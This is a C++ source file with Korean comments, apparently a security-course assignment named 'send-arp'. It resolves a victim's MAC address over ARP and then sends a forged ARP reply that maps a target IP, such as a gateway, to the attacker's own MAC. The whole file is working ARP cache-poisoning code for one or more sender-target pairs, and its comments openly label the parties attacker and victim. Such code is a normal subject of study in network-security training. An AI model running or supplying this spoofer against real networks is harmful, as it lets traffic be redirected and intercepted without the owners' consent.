#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"
#include "ip.h"

// BUFSIZE for pcap capture
#define BUFSIZE 8192

// MAC 주소는 6바이트, IP 주소는 4바이트
#define MAC_SIZE 6
#define IP_SIZE 4

#pragma pack(push, 1)
struct EthArpPacket final
{
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

// t_info 구조체 (Attacker, Victim, Target 정보를 담음)
typedef struct t_info
{
    Mac mac;
    Ip ip;
} t_info;

void usage()
{
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

typedef struct MacAddress
{
    uint8_t address[MAC_SIZE];
} s_MacAddress;

// 공격자의 MAC 주소를 가져옴
s_MacAddress getMacAddress(char *interfaceName)
{
    int sockFD = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockFD == -1)
    {
        perror("socket");
        exit(1);
    }

    struct ifreq ifRequest;
    memset(&ifRequest, 0, sizeof(ifRequest));
    strncpy(ifRequest.ifr_name, interfaceName, IFNAMSIZ - 1);

    if (ioctl(sockFD, SIOCGIFHWADDR, &ifRequest) == -1)
    {
        perror("ioctl");
        close(sockFD);
        exit(1);
    }

    close(sockFD);

    s_MacAddress macAddr;
    memcpy(macAddr.address, ifRequest.ifr_hwaddr.sa_data, MAC_SIZE);
    return macAddr;
}

// 공격자의 IP 주소를 가져옴
uint32_t getIpAddress(char *interfaceName)
{
    int sockFD = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockFD == -1)
    {
        perror("socket");
        exit(1);
    }

    struct ifreq ifRequest;
    memset(&ifRequest, 0, sizeof(ifRequest));
    strncpy(ifRequest.ifr_name, interfaceName, IFNAMSIZ - 1);

    if (ioctl(sockFD, SIOCGIFADDR, &ifRequest) == -1)
    {
        perror("ioctl");
        close(sockFD);
        exit(1);
    }

    close(sockFD);

    return ((struct sockaddr_in *)&ifRequest.ifr_addr)->sin_addr.s_addr;
}

int main(int argc, char *argv[])
{
    // 인자 개수 체크: 인터페이스 + (sender, target) 쌍, 즉 최소 4개 이상이면서 (argc - 2)가 짝수여야 함.
    if (argc < 4 || ((argc - 2) % 2) != 0)
    {
        usage();
        return EXIT_FAILURE;
    }

    s_MacAddress attackerMac = getMacAddress(argv[1]);
    uint32_t attackerIp = getIpAddress(argv[1]);

    // 각 sender-target 쌍에 대해 작업 수행
    for (int pairIndex = 1; pairIndex <= (argc - 2) / 2; pairIndex++)
    {
        char attackerMacStr[18] = "";
        sprintf(attackerMacStr, "%02x:%02x:%02x:%02x:%02x:%02x",
                attackerMac.address[0], attackerMac.address[1], attackerMac.address[2],
                attackerMac.address[3], attackerMac.address[4], attackerMac.address[5]);

        char errBuffer[PCAP_ERRBUF_SIZE];

        pcap_t *pcapHandle = pcap_open_live(argv[1], BUFSIZE, 1, 1, errBuffer);
        if (pcapHandle == nullptr)
        {
            fprintf(stderr, "couldn't open device %s(%s)\n", argv[1], errBuffer);
            return -1;
        }

        EthArpPacket arpRequest;

        // ARP 요청 패킷 구성
        arpRequest.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
        arpRequest.eth_.smac_ = Mac(attackerMacStr);
        arpRequest.eth_.type_ = htons(EthHdr::Arp);

        arpRequest.arp_.hrd_ = htons(ArpHdr::ETHER);
        arpRequest.arp_.pro_ = htons(EthHdr::Ip4);
        arpRequest.arp_.hln_ = MAC_SIZE;
        arpRequest.arp_.pln_ = IP_SIZE;
        arpRequest.arp_.op_ = htons(ArpHdr::Request);
        arpRequest.arp_.smac_ = Mac(attackerMacStr);
        arpRequest.arp_.sip_ = htonl(Ip(std::string(Ip(htonl(attackerIp))).c_str()));
        arpRequest.arp_.tmac_ = Mac("00:00:00:00:00:00");      // MAC 주소 미지정
        arpRequest.arp_.tip_ = htonl(Ip(argv[2 * pairIndex])); // sender의 IP 주소

        int sendResult = pcap_sendpacket(pcapHandle, reinterpret_cast<const u_char *>(&arpRequest), sizeof(EthArpPacket));
        if (sendResult != 0)
        {
            fprintf(stderr, "pcap_sendpacket returned %d error=%s\n", sendResult, pcap_geterr(pcapHandle));
            return -1;
        }

        // ARP 응답 패킷 대기
        while (true)
        {
            printf("Waiting for ARP reply...\n");
            struct pcap_pkthdr *header;
            const u_char *packetData;

            int recvResult = pcap_next_ex(pcapHandle, &header, &packetData);
            if (recvResult == 0)
                continue; // 타임아웃 발생
            if (recvResult == -1 || recvResult == -2)
            {
                fprintf(stderr, "pcap_next_ex returned %d(%s)\n", recvResult, pcap_geterr(pcapHandle));
                break;
            }

            printf("ARP reply captured\n");

            EthArpPacket *arpReply = reinterpret_cast<EthArpPacket *>(const_cast<u_char *>(packetData));

            if (arpReply->arp_.sip_ == arpRequest.arp_.tip_ &&
                arpReply->eth_.type_ == htons(EthHdr::Arp) &&
                arpReply->arp_.op_ == htons(ArpHdr::Reply))
            {

                Mac victimMac = arpReply->arp_.smac_;
                printf("Victim's MAC address: %s", std::string(victimMac).c_str());
                printf("Victim's IP address: %s\n", std::string(Ip(arpReply->arp_.sip_)).c_str());

                EthArpPacket spoofedReply;

                spoofedReply.eth_.dmac_ = Mac(victimMac);
                spoofedReply.eth_.smac_ = Mac(attackerMacStr);
                spoofedReply.eth_.type_ = htons(EthHdr::Arp);

                spoofedReply.arp_.hrd_ = htons(ArpHdr::ETHER);
                spoofedReply.arp_.pro_ = htons(EthHdr::Ip4);
                spoofedReply.arp_.hln_ = MAC_SIZE;
                spoofedReply.arp_.pln_ = IP_SIZE;
                spoofedReply.arp_.op_ = htons(ArpHdr::Reply);
                spoofedReply.arp_.smac_ = Mac(attackerMacStr);
                spoofedReply.arp_.sip_ = htonl(Ip(argv[2 * pairIndex + 1]));
                spoofedReply.arp_.tmac_ = Mac(victimMac);
                spoofedReply.arp_.tip_ = htonl(Ip(argv[2 * pairIndex])); // sender의 IP 주소

                int spoofSendResult = pcap_sendpacket(pcapHandle, reinterpret_cast<const u_char *>(&spoofedReply), sizeof(EthArpPacket));
                if (spoofSendResult != 0)
                {
                    fprintf(stderr, "pcap_sendpacket returned %d error=%s\n", spoofSendResult, pcap_geterr(pcapHandle));
                    return -1;
                }
                break;
            }
            printf("Not an ARP reply packet\n");
        }

        pcap_close(pcapHandle);
    }
    return 0;
}
